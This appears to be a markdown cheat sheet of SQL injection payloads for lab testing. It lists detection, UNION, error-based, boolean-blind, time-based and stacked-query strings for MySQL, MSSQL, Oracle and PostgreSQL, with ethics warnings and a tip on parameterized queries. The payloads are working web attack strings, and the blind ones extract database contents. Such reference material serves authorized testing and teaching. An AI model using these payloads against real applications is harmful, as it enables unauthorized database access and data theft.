# Common SQL Injection Payloads & Examples (Safe Testing)

> [!WARNING]
> **Ethics reminder:** These payloads are **for education and lab environments only**. Never run them against unauthorized systems.

---

## 1. Basic detection payloads

* Single quote: `'` — triggers syntax errors if not escaped.
* Double quote: `"` — depending on context.
* Logical tests:

```sql
1 OR 1=1 --
1 AND 1=2 --
```

Used to confirm influence on query logic.

---

## 2. Union-based examples

* Find column count (safe incremental NULLs):

```sql
' UNION SELECT NULL --
' UNION SELECT NULL, NULL --
' UNION SELECT NULL, NULL, NULL --
```

* Identify display columns:

```sql
' UNION SELECT 'A','B','C' --
```

* Fingerprint DB (non-destructive):

```sql
' UNION SELECT NULL, version(), NULL --  # MySQL
' UNION SELECT NULL, @@version, NULL --  # MSSQL
' UNION SELECT NULL, banner, NULL FROM v$version --  # Oracle
```

---

## 3. Error-based payloads (safe probes)

* Trigger syntax or type errors to fingerprint the DBMS:

```sql
' AND 1=(SELECT CAST(user() AS SIGNED)) --  # MySQL
' AND 1=(SELECT CONVERT(INT, SYSTEM_USER)) --  # MSSQL
' AND 1=(SELECT TO_NUMBER(user)) --  # Oracle
```

* Avoid destructive operations; only observe error messages.

---

## 4. Boolean-based blind payloads

* Character extraction patterns:

```sql
' AND SUBSTRING((SELECT user()),1,1)='a' --  # MySQL
' AND SUBSTRING((SELECT SYSTEM_USER),1,1)='a' --  # MSSQL
' AND SUBSTR((SELECT user FROM dual),1,1)='A' --  # Oracle
' AND SUBSTRING((SELECT current_user),1,1)='a' --  # PostgreSQL
```

* Confirm influence with `AND 1=1 / AND 1=2` first.

---

## 5. Time-based blind payloads

* MySQL: `SLEEP(seconds)`

```sql
' OR IF(1=1, SLEEP(5), 0) --
```

* MSSQL: `WAITFOR DELAY '00:00:05'`

```sql
' ; IF 1=1 WAITFOR DELAY '00:00:05' --
```

* PostgreSQL: `pg_sleep(seconds)`

```sql
' OR CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END --
```

* Oracle: `DBMS_LOCK.SLEEP(seconds)` (requires privilege)

```sql
' AND CASE WHEN 1=1 THEN DBMS_LOCK.SLEEP(5) ELSE NULL END IS NULL --
```

* Always measure response times carefully; repeat to reduce false positives.

---

## 6. Stacked-query payloads (non-destructive)

* Check if multiple statements are allowed (safe select only):

```sql
' ; SELECT 'X' --
' ; BEGIN NULL; END; --  # Oracle PL/SQL block
```

* Do **not** include destructive queries like `DROP` or `DELETE` in test environments.

---

## 7. Tips for safe practice

> [!TIP]
> * Use parameterized queries or ORM bindings in real applications.
> * Test only in lab or explicitly authorized environments.
> * Combine these payloads with tools like Burp Suite and sqlmap for controlled testing.
> * Document all experiments; ensure repeatability and safety.